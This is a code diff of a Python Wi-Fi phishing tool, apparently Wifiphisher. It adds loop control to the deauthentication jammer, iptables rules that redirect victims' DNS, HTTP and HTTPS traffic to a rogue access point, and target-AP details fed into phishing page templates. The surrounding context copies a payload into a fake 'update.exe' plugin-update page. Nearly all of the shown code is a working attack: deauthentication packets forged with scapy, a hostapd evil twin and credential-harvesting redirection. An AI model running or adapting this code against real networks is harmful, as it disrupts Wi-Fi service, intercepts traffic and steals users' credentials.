@@ -9,6 +9,7 @@ import argparse
 import fcntl
 from threading import Thread, Lock
 from subprocess import Popen, PIPE, check_output
+from distutils.spawn import find_executable
 import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
@@ -19,11 +20,14 @@ import macmatcher
 import interfaces
 from constants import *
 
+VERSION = "1.1GIT"
 conf.verb = 0
 count = 0  # for channel hopping Thread
 APs = {} # for listing APs
 clients_APs = []
 hop_daemon_running = True
+sniff_daemon_running = True
+jamming_daemon_running = True
 terminate = False
 lock = Lock()
 args = 0
@@ -126,10 +130,19 @@ def check_args(args):
     or len(args.presharedkey) > 64):
         sys.exit('[' + R + '-' + W + '] Pre-shared key must be between 8 and 63 printable characters.')
 
+def stopfilter(x):
+    if not sniff_daemon_running:
+        return True
+    return False
+
 def shutdown(wireless_interfaces=None):
     """
     Shutdowns program.
     """
+    global jamming_daemon_running, sniff_daemon_running
+    jamming_daemon_running = False
+    sniff_daemon_running = False
+
     os.system('iptables -F')
     os.system('iptables -X')
     os.system('iptables -t nat -F')
@@ -137,14 +150,13 @@ def shutdown(wireless_interfaces=None):
     os.system('pkill airbase-ng')
     os.system('pkill dnsmasq')
     os.system('pkill hostapd')
+
     if os.path.isfile('/tmp/wifiphisher-webserver.tmp'):
         os.remove('/tmp/wifiphisher-webserver.tmp')
     if os.path.isfile('/tmp/wifiphisher-jammer.tmp'):
         os.remove('/tmp/wifiphisher-jammer.tmp')
     if os.path.isfile('/tmp/hostapd.conf'):
         os.remove('/tmp/hostapd.conf')
-    if os.path.isfile('/tmp/wifiphisher-hostapd.log'):
-        os.remove('/tmp/wifiphisher-hostapd.log')
 
     # set all the used interfaces to managed (normal) mode and show any errors
     if wireless_interfaces:
@@ -156,7 +168,7 @@ def shutdown(wireless_interfaces=None):
                     interfaces.IwconfigCmdError) as err:
                 print err
 
-    print '\n[' + R + '!' + W + '] Closing'
+    print '[' + R + '!' + W + '] Closing'
     sys.exit(0)
 
 
@@ -193,7 +205,14 @@ def channel_hop(mon_iface):
 def sniffing(interface, cb):
     '''This exists for if/when I get deauth working
     so that it's easy to call sniff() in a thread'''
-    sniff(iface=interface, prn=cb, store=0)
+    try:
+        sniff(iface=interface, prn=cb, store=0, stop_filter=stopfilter)
+    except socket.error as e:
+        # Network is down
+        if e.errno == 100:
+            pass
+        else:
+            raise
 
 
 def targeting_cb(pkt):
@@ -364,13 +383,13 @@ def start_ap(mon_iface, channel, essid, args):
     with open('/tmp/hostapd.conf', 'w') as dhcpconf:
             dhcpconf.write(config % (mon_iface, essid, channel))
 
-    Popen(['hostapd', '/tmp/hostapd.conf', '-f', '/tmp/wifiphisher-hostapd.log'], stdout=DN, stderr=DN)
+    hostapd_proc = Popen(['hostapd', '/tmp/hostapd.conf'], stdout=DN, stderr=DN)
     try:
         time.sleep(6)  # Copied from Pwnstar which said it was necessary?
-        proc = check_output(['cat', '/tmp/wifiphisher-hostapd.log'])
-        if 'driver initialization failed' in proc:
+        if hostapd_proc.poll() != None:
+            # hostapd will exit on error
             print('[' + R + '+' + W +
-                  '] Driver initialization failed! (hostapd error)\n' +
+                  '] Failed to start the fake access point! (hostapd error)\n' +
                   '[' + R + '+' + W +
                   '] Try a different wireless interface using -aI option.'
                   )
@@ -473,55 +492,56 @@ def deauth(monchannel):
     and starts a thread to deauth each instance
     '''
 
-    global clients_APs, APs, args
+    global clients_APs, APs, args, jamming_daemon_running
 
     pkts = []
 
-    if len(clients_APs) > 0:
-        with lock:
-            for x in clients_APs:
-                client = x[0]
-                ap = x[1]
-                ch = x[2]
-                '''
-                Can't add a RadioTap() layer as the first layer or it's a
-                malformed Association request packet?
-                Append the packets to a new list so we don't have to hog the
-                lock type=0, subtype=12?
-                '''
-                if ch == monchannel:
-                    deauth_pkt1 = Dot11(
-                        addr1=client,
-                        addr2=ap,
-                        addr3=ap) / Dot11Deauth()
-                    deauth_pkt2 = Dot11(
-                        addr1=ap,
-                        addr2=client,
-                        addr3=client) / Dot11Deauth()
-                    pkts.append(deauth_pkt1)
-                    pkts.append(deauth_pkt2)
-    if len(APs) > 0:
-        if not args.directedonly:
+    while jamming_daemon_running:
+        if len(clients_APs) > 0:
             with lock:
-                for a in APs:
-                    ap = a[0]
-                    ch = a[1]
+                for x in clients_APs:
+                    client = x[0]
+                    ap = x[1]
+                    ch = x[2]
+                    '''
+                    Can't add a RadioTap() layer as the first layer or it's a
+                    malformed Association request packet?
+                    Append the packets to a new list so we don't have to hog the
+                    lock type=0, subtype=12?
+                    '''
                     if ch == monchannel:
-                        deauth_ap = Dot11(
-                            addr1='ff:ff:ff:ff:ff:ff',
+                        deauth_pkt1 = Dot11(
+                            addr1=client,
                             addr2=ap,
                             addr3=ap) / Dot11Deauth()
-                        pkts.append(deauth_ap)
+                        deauth_pkt2 = Dot11(
+                            addr1=ap,
+                            addr2=client,
+                            addr3=client) / Dot11Deauth()
+                        pkts.append(deauth_pkt1)
+                        pkts.append(deauth_pkt2)
+        if len(APs) > 0:
+            if not args.directedonly:
+                with lock:
+                    for a in APs:
+                        ap = a[0]
+                        ch = a[1]
+                        if ch == monchannel:
+                            deauth_ap = Dot11(
+                                addr1='ff:ff:ff:ff:ff:ff',
+                                addr2=ap,
+                                addr3=ap) / Dot11Deauth()
+                            pkts.append(deauth_ap)
 
-    if len(pkts) > 0:
-        # prevent 'no buffer space' scapy error http://goo.gl/6YuJbI
-        if not args.timeinterval:
-            args.timeinterval = 0
-        if not args.packets:
-            args.packets = 1
+        if len(pkts) > 0:
+            # prevent 'no buffer space' scapy error http://goo.gl/6YuJbI
+            if not args.timeinterval:
+                args.timeinterval = 0
+            if not args.packets:
+                args.packets = 1
 
-        for p in pkts:
-            send(p, inter=float(args.timeinterval), count=int(args.packets))
+            for p in pkts:
+                send(p, inter=float(args.timeinterval), count=int(args.packets))
 
 
 def output(monchannel):
@@ -575,45 +595,46 @@ def cb(pkt):
     are type 1 or 2 (control, data), and append the addr1 and addr2
     to the list of deauth targets.
     '''
-    global clients_APs, APs, args
+    global clients_APs, APs, args, sniff_daemon_running
 
-    # return these if's keeping clients_APs the same or just reset clients_APs?
-    # I like the idea of the tool repopulating the variable more
-    if args.maximum:
-        if args.noupdate:
-            if len(clients_APs) > int(args.maximum):
-                return
-        else:
-            if len(clients_APs) > int(args.maximum):
-                with lock:
-                    clients_APs = []
-                    APs = []
+    if sniff_daemon_running:
+        # return these if's keeping clients_APs the same or just reset clients_APs?
+        # I like the idea of the tool repopulating the variable more
+        if args.maximum:
+            if args.noupdate:
+                if len(clients_APs) > int(args.maximum):
+                    return
+            else:
+                if len(clients_APs) > int(args.maximum):
+                    with lock:
+                        clients_APs = []
+                        APs = []
 
-    '''
-    We're adding the AP and channel to the deauth list at time of creation
-    rather than updating on the fly in order to avoid costly for loops
-    that require a lock.
-    '''
+        '''
+        We're adding the AP and channel to the deauth list at time of creation
+        rather than updating on the fly in order to avoid costly for loops
+        that require a lock.
+        '''
 
-    if pkt.haslayer(Dot11):
-        if pkt.addr1 and pkt.addr2:
+        if pkt.haslayer(Dot11):
+            if pkt.addr1 and pkt.addr2:
 
-            # Filter out all other APs and clients if asked
-            if args.accesspoint:
-                if args.accesspoint not in [pkt.addr1, pkt.addr2]:
+                # Filter out all other APs and clients if asked
+                if args.accesspoint:
+                    if args.accesspoint not in [pkt.addr1, pkt.addr2]:
+                        return
+
+                # Check if it's added to our AP list
+                if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
+                    APs_add(clients_APs, APs, pkt, args.channel)
+
+                # Ignore all the noisy packets like spanning tree
+                if noise_filter(args.skip, pkt.addr1, pkt.addr2):
                     return
 
-            # Check if it's added to our AP list
-            if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
-                APs_add(clients_APs, APs, pkt, args.channel)
-
-            # Ignore all the noisy packets like spanning tree
-            if noise_filter(args.skip, pkt.addr1, pkt.addr2):
-                return
-
-            # Management = 1, data = 2
-            if pkt.type in [1, 2]:
-                clients_APs_add(clients_APs, pkt.addr1, pkt.addr2)
+                # Management = 1, data = 2
+                if pkt.type in [1, 2]:
+                    clients_APs_add(clients_APs, pkt.addr1, pkt.addr2)
 
 
 def APs_add(clients_APs, APs, pkt, chan_arg):
@@ -690,7 +711,14 @@ def sniff_dot11(mon_iface):
     """
     We need this here to run it from a thread.
     """
-    sniff(iface=mon_iface, store=0, prn=cb)
+    try:
+        sniff(iface=mon_iface, store=0, prn=cb, stop_filter=stopfilter)
+    except socket.error as e:
+        # Network is down
+        if e.errno == 100:
+            pass
+        else:
+            raise
 
 def get_dnsmasq():
     if not os.path.isfile('/usr/sbin/dnsmasq'):
@@ -746,23 +774,65 @@ def get_hostapd():
             '[' + R + '!' + W + '] Closing'
          ))
 
+def get_ifconfig():
+    # This is only useful for Arch Linux which does not contain ifconfig by default
+    if not find_executable('ifconfig'):
+        install = raw_input(
+            ('[' + T + '*' + W + '] ifconfig not found. ' +
+             'install now? [y/n] ')
+        )
+        if install == 'y':
+            if os.path.isfile('/usr/bin/pacman'):
+                os.system('pacman -S net-tools')
+            else:
+                sys.exit((
+                    '\n[' + R + '-' + W + '] Don\'t know how to install ifconfig for your distribution.\n' +
+                    '[' + G + '+' + W + '] Rerun the script after installing it manually.\n' +
+                    '[' + R + '!' + W + '] Closing'
+                ))
+        else:
+            sys.exit(('[' + R + '-' + W + '] ifconfig' +
+                     ' not found'))
+    if not find_executable('ifconfig'):
+        sys.exit((
+            '\n[' + R + '-' + W + '] Unable to install the \'net-tools\' package!\n' +
+            '[' + T + '*' + W + '] This process requires a persistent internet connection!\n' +
+            '[' + G + '+' + W + '] Run pacman -Syu to make sure you are up to date first.\n' +
+            '[' + G + '+' + W + '] Rerun the script to install net-tools.\n' +
+            '[' + R + '!' + W + '] Closing'
+         ))
+
+def kill_interfering_procs():
+    # Kill any possible programs that may interfere with the wireless card
+    # For systems with airmon-ng installed
+    if os.path.isfile('/usr/sbin/airmon-ng'):
+        proc = Popen(['airmon-ng', 'check', 'kill'], stdout=PIPE, stderr=DN)
+    # For ubuntu distros with nmcli
+    elif os.path.isfile('/usr/bin/nmcli') and \
+            os.path.isfile('/usr/sbin/rfkill'):
+        Popen(
+            ['nmcli', 'radio', 'wifi', 'off'],
+            stdout=PIPE,
+            stderr=DN
+        ).wait()
+        Popen(
+            ['rfkill', 'unblock', 'wlan'],
+            stdout=PIPE,
+            stderr=DN
+        ).wait()
+
+        time.sleep(1)
+
 def run():
 
-    print "               _  __ _       _     _     _               "
-    print "              (_)/ _(_)     | |   (_)   | |              "
-    print "     __      ___| |_ _ _ __ | |__  _ ___| |__   ___ _ __ "
-    print "     \ \ /\ / / |  _| | '_ \| '_ \| / __| '_ \ / _ \ '__|"
-    print "      \ V  V /| | | | | |_) | | | | \__ \ | | |  __/ |   "
-    print "       \_/\_/ |_|_| |_| .__/|_| |_|_|___/_| |_|\___|_|   "
-    print "                      | |                                "
-    print "                      |_|                                "
-    print "                                                         "
+    print ('[' + T + '*' + W + '] Starting Wifiphisher %s at %s' % \
+          (VERSION, time.strftime("%Y-%m-%d %H:%M")))
 
     # Initialize a list to store the used interfaces
     used_interfaces = list()
 
     # Parse args
-    global args, APs, clients_APs, mon_MAC, mac_matcher
+    global args, APs, clients_APs, mon_MAC, mac_matcher, hop_daemon_running
     args = parse_args()
 
     # Check args
@@ -772,11 +842,10 @@ def run():
     if os.geteuid():
         sys.exit('[' + R + '-' + W + '] Please run as root')
 
-    # Get hostapd if needed
+    # Get hostapd, dnsmasq or ifconfig if needed
     get_hostapd()
-
-    # Get dnsmasq if needed
     get_dnsmasq()
+    get_ifconfig()
 
     # TODO: We should have more checks here:
     # Is anything binded to our HTTP(S) ports?
@@ -787,18 +856,22 @@ def run():
 
     mac_matcher = macmatcher.MACMatcher(MAC_PREFIX_FILE)
 
+
     # get interfaces for monitor mode and AP mode and set the monitor interface
     # to monitor mode. shutdown on any errors
     try:
         mon_iface, ap_iface = network_manager.get_interfaces()
+
+        kill_interfering_procs()
+
         # TODO: this line should be removed once all the wj_iface have been
         # removed
         wj_iface = mon_iface
 
         # display selected interfaces to the user
-        print ("\n[{0}+{1}] Selecting {0}{2}{1} interface for the deauthentication "\
+        print ("[{0}+{1}] Selecting {0}{2}{1} interface for the deauthentication "\
                "attack\n[{0}+{1}] Selecting {0}{3}{1} interface for creating the "\
-               "rogue access point").format(G, W, mon_iface, ap_iface)
+               "rogue Access Point").format(G, W, mon_iface, ap_iface)
 
         # set monitor mode to monitor interface
         network_manager.set_interface_mode(mon_iface, "monitor")
@@ -806,9 +879,9 @@ def run():
             interfaces.JammingInterfaceInvalidError,
             interfaces.ApInterfaceInvalidError,
             interfaces.NoApInterfaceFoundError,
-            interfaces.NoMonitorInterfaceFoundError, interfaces.IwCmdError,
-            interfaces.IwconfigCmdError, interfaces.IfconfigCmdError) as err:
+            interfaces.NoMonitorInterfaceFoundError) as err:
         print ("[{0}!{1}] " + str(err)).format(R, W)
+        time.sleep(2)
         shutdown()
 
     # add the selected interfaces to the used list
@@ -818,6 +891,14 @@ def run():
     os.system(
         ('iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination %s:%s'
          % (NETWORK_GW_IP, PORT))
+    )
+    os.system(
+        ('iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination %s:%s'
+         % (NETWORK_GW_IP, 53))
+    )
+    os.system(
+        ('iptables -t nat -A PREROUTING -p tcp --dport 53 -j DNAT --to-destination %s:%s'
+         % (NETWORK_GW_IP, 53))
     )
     os.system(
         ('iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination %s:%s'
@@ -868,14 +949,26 @@ def run():
 
         copyfile(payload_path, PHISHING_PAGES_DIR + '/plugin_update/update/update.exe')
 
+    APs_context = []
+    for i in APs:
+        APs_context.append({
+            'channel': APs[i][0],
+            'essid': APs[i][1],
+            'bssid': APs[i][2],
+            'vendor': mac_matcher.get_vendor_name(APs[i][2])
+        })
 
-    # set the path for the template
-    phishinghttp.set_template_path(template.get_path())
+    template.merge_context({'APs': APs_context})
 
-    # Kill any possible programs that may interfere with the wireless card
-    # Only for systems with airmon-ng installed
-    if os.path.isfile('/usr/sbin/airmon-ng'):
-        proc = Popen(['airmon-ng', 'check', 'kill'], stdout=PIPE, stderr=DN)
+    template.merge_context({
+        'target_ap_channel': channel,
+        'target_ap_essid': essid,
+        'target_ap_bssid': ap_mac,
+        'target_ap_vendor': mac_matcher.get_vendor_name(ap_mac)
+    })
+
+    phishinghttp.serve_template(template)
+
     # Start AP
     start_ap(ap_iface, channel, essid, args)
     dhcpconf = dhcp_conf(ap_iface)
@@ -925,7 +1018,7 @@ def run():
 
     time.sleep(3)
 
-    #no longer need mac_matcher
+    # We no longer need mac_matcher
     mac_matcher.unbind()
 
     clients_APs = []
@@ -974,7 +1067,6 @@ def run():
                 lines = "\n" * LINES_OUTPUT
             print lines
             if phishinghttp.terminate:
-                time.sleep(3)
                 shutdown(used_interfaces)
             time.sleep(0.5)
     except KeyboardInterrupt:
